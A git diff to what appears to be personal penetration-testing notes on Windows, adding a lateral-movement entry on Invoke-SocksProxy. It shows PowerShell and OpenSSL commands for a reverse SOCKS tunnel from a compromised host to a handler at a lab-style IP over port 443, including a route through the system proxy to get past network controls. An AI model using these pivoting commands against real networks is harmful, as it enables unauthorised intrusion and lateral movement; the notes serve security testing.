@@ -120,6 +120,7 @@ A place for me to store my notes/tricks for Windows Based Systems.
    * <a href="#lateral-movement">Lateral Movement</a>
       * <a href="#-plink">Plink</a>
       * <a href="#-powershell-port-forward">Powershell Port Forward</a>
+      * <a href="#-invoke-socks-proxy">Invoke Socks Proxy</a>
       * <a href="#-socat-for-windows">Socat for Windows</a>
       * <a href="#-secure-sockets-funneling">Secure Sockets Funneling</a>
       * <a href="#-chisel-fast-tcp-tunnel-over-http-secured-by-ssh">Chisel (Fast TCP Tunnel over HTTP secured by SSH)</a>
@@ -1854,6 +1855,40 @@ toport: the port number to forward to
 toip: the ip address to forward to
 ```
 
+#### [](#header-4) Invoke-SocksProxy
+
+```powershell
+#https://github.com/p3nt4/Invoke-SocksProxy/
+
+Local Socks4 Proxy on 1080
+
+Import-Module .\Invoke-SocksProxy.psm1
+Invoke-SocksProxy -bindPort 1080
+
+
+Reverse Socks Proxy on Remote Machine Port 1080
+
+# On the remote host: 
+# Generate a private key and self signed cert
+openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout private.key -out cert.pem
+
+# Get the certificate fingerprint to verify it:
+openssl x509 -in cert.pem -noout -sha1 -fingerprint | cut -d "=" -f 2 | tr -d ":"
+
+# Start the handler
+python ReverseSocksProxyHandler.py 443 1080 ./cert.pem ./private.key
+
+# On the local host:
+Import-Module .\Invoke-SocksProxy.psm1
+Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 
+
+# Go through the system proxy:
+Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy
+
+# Validate certificate
+Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy -certFingerprint '93061FDB30D69A435ACF96430744C5CC5473D44E'
+
+```
 
 
 #### [](#header-4) Socat for Windows
